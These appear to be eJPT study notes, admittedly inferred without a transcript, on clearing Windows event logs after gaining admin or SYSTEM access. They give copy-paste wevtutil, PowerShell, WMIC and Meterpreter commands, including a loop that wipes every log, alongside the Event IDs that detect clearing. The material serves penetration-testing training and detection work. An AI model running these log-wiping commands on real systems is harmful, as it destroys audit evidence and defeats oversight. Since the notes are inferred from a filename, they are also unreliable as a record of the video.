# What the video covers (Introduction / big picture)
Note: No transcript was provided. The following is inferred from the filename and the Windows Post-Exploitation context typical in eJPT training.

This module demonstrates how to identify, export, and clear Windows event logs after gaining administrative or SYSTEM access on a target host, and what artifacts clearing generates. It compares built-in methods (wevtutil, PowerShell, WMIC, Event Viewer) and common post-exploitation tooling (e.g., Meterpreter’s clearev), along with OPSEC considerations and verification steps.

Only perform these actions in authorized lab/training environments. Clearing logs is inherently noisy and detectable, and it may violate policy or law if done without explicit authorization.

# Flow (ordered)
1. Confirm privileges
   - Ensure you are Administrator or SYSTEM; Security log clearing requires “Manage auditing and security log” (SeSecurityPrivilege).
2. Identify target logs
   - Common: Security, System, Application, and Microsoft-Windows-PowerShell/Operational.
3. Optional: Export logs before clearing
   - For forensics-friendly engagements or to avoid breaking workflows.
4. Clear selected logs using a chosen method
   - wevtutil (reliable for classic and modern logs)
   - PowerShell (Clear-EventLog for classic logs)
   - WMIC (legacy)
   - Meterpreter clearev (Application/System/Security)
   - Event Viewer GUI (manual)
5. Verify clearing
   - Query recent events to confirm size/entries; expect “log cleared” events.
6. Understand artifacts and detection
   - Clearing logs generates notable events (e.g., 1102, 104) and won’t remove externally forwarded/aggregated logs (SIEM/WEF).
7. OPSEC guidance
   - Target only necessary logs; know that clearing is conspicuous; prefer minimizing footprint over wiping.

# Tools highlighted
- Built-in Windows
  - wevtutil (list/export/clear/query logs)
  - PowerShell (Get-WinEvent, Clear-EventLog, Get-EventLog)
  - Event Viewer (eventvwr.msc)
  - WMIC (nteventlog class; legacy)
- Post-exploitation
  - Meterpreter (clearev)
- Sysinternals
  - PsExec (to obtain SYSTEM when needed)

# Typical command walkthrough (detailed, copy-paste friendly)
All commands assume you have Administrator (ideally SYSTEM) on the target. Use an elevated CMD or PowerShell. Quotes are important for logs with spaces or slashes.

Privilege check:
```cmd
whoami /groups | findstr /I "Administrators"
whoami /priv
net session  && echo Admin OK || echo Not admin
```

List logs (discover exact names):
```cmd
wevtutil el
```

Preview a few recent events (reverse chronological) from key logs:
```cmd
wevtutil qe Security /c:5 /f:text /rd:true
wevtutil qe System /c:5 /f:text /rd:true
wevtutil qe Application /c:5 /f:text /rd:true
wevtutil qe "Microsoft-Windows-PowerShell/Operational" /c:5 /f:text /rd:true
```

Optional: Export logs before clearing (creates .evtx backups):
```cmd
mkdir C:\Temp 2>nul
wevtutil epl Security C:\Temp\Security.evtx /ow:true
wevtutil epl System C:\Temp\System.evtx /ow:true
wevtutil epl Application C:\Temp\Application.evtx /ow:true
wevtutil epl "Microsoft-Windows-PowerShell/Operational" C:\Temp\PS-Operational.evtx /ow:true
```

Clear specific logs (precise, targeted):
```cmd
wevtutil cl Security
wevtutil cl System
wevtutil cl Application
wevtutil cl "Microsoft-Windows-PowerShell/Operational"
```

Clear classic logs via PowerShell (Application/System/Security):
```powershell
# Run in elevated PowerShell
Clear-EventLog -LogName Application, System, Security
```

Clear any log via wevtutil from PowerShell:
```powershell
wevtutil cl "Microsoft-Windows-PowerShell/Operational"
```

Clear “all” logs (very noisy; strongly discouraged):
- CMD (interactive shell):
```cmd
for /f "tokens=*" %G in ('wevtutil.exe el') do wevtutil.exe cl "%G"
```
- CMD (batch file; note double %%):
```cmd
for /f "tokens=*" %%G in ('wevtutil.exe el') do wevtutil.exe cl "%%G"
```

WMIC (legacy; classic logs):
```cmd
wmic nteventlog get LogFileName
wmic nteventlog where LogFileName="Security" call ClearEventLog
wmic nteventlog where LogFileName="Application" call ClearEventLog
wmic nteventlog where LogFileName="System" call ClearEventLog
```

Meterpreter (clears Application/System/Security):
```text
meterpreter > getsystem
meterpreter > clearev
```

Verify clearing (expect a “log cleared” event to remain as the latest entry):
```cmd
wevtutil qe Security /c:3 /f:text /rd:true
wevtutil qe System /c:3 /f:text /rd:true
wevtutil qe Application /c:3 /f:text /rd:true
wevtutil qe "Microsoft-Windows-PowerShell/Operational" /c:3 /f:text /rd:true
```

Obtain SYSTEM via PsExec (if needed for stubborn logs):
```cmd
PsExec64.exe -accepteula -s -i cmd.exe
```

Event Viewer GUI (manual):
```cmd
eventvwr.msc
# Right-click a log (e.g., Security) -> Clear Log... -> optionally Save and Clear
```

# Practical tips
- Privileges:
  - Clearing Security requires SeSecurityPrivilege (Administrators typically have it). SYSTEM is most reliable.
- Artifacts and detections:
  - Event ID 1102 (Security): “The audit log was cleared.”
  - Event ID 104 (System, source: EventLog): “The log file was cleared.” (applies to any log cleared)
  - Older systems may show 517 for similar activity.
  - These events are strong signals; they cannot be removed without further noise and risk.
- Scope smartly:
  - Prefer targeted clearing (e.g., PowerShell Operational) over “clear all.”
  - Clearing does not affect logs already forwarded to SIEM/WEF.
- Tool behavior:
  - Clear-EventLog handles classic logs only (Application/System/Security). Use wevtutil for “Applications and Services Logs.”
  - WMIC is deprecated but often present; use wevtutil as primary.
- Don’t delete .evtx files:
  - Files live in C:\Windows\System32\winevt\Logs\ but deleting/tampering is risky, often blocked, and highly conspicuous.
- Verification:
  - Always query a few events after clearing; expect to see the “log cleared” event at/near the top.
- OPSEC:
  - Clearing is loud. Where possible, minimize footprint instead (e.g., avoid running PowerShell with logging enabled, reduce noisy actions). If you must clear, accept the detection trade-off.

# Minimal cheat sheet (one-screen flow)
```cmd
:: 1) Check admin/SYSTEM
whoami /priv
net session

:: 2) List logs and preview
wevtutil el
wevtutil qe Security /c:5 /f:text /rd:true

:: 3) Optional backup
mkdir C:\Temp 2>nul
wevtutil epl Security C:\Temp\Security.evtx /ow:true

:: 4) Clear key logs (targeted)
wevtutil cl Security
wevtutil cl System
wevtutil cl Application
wevtutil cl "Microsoft-Windows-PowerShell/Operational"

:: 5) Verify (expect 1102/104)
wevtutil qe Security /c:3 /f:text /rd:true
wevtutil qe System /c:3 /f:text /rd:true

:: (Alt) PowerShell classic logs
powershell -NoLogo -NoProfile -Command "Clear-EventLog -LogName Application, System, Security"

:: (Alt) Clear all (NOISY — not recommended)
for /f "tokens=*" %G in ('wevtutil el') do wevtutil cl "%G"
```

# Summary
In this Windows post-exploitation segment, you learn how to identify, export, and clear event logs using built-in tools (wevtutil, PowerShell, WMIC), GUI (Event Viewer), and post-exploitation tooling (Meterpreter). The key takeaways are: ensure admin/SYSTEM privileges, target only the necessary logs (Security/System/Application/PowerShell Operational), optionally export before clearing, verify results, and understand that clearing logs is highly detectable—expect Event IDs 1102 (Security) and 104 (System). Use these procedures only in authorized lab or engagement contexts and weigh the OPSEC trade-offs before clearing.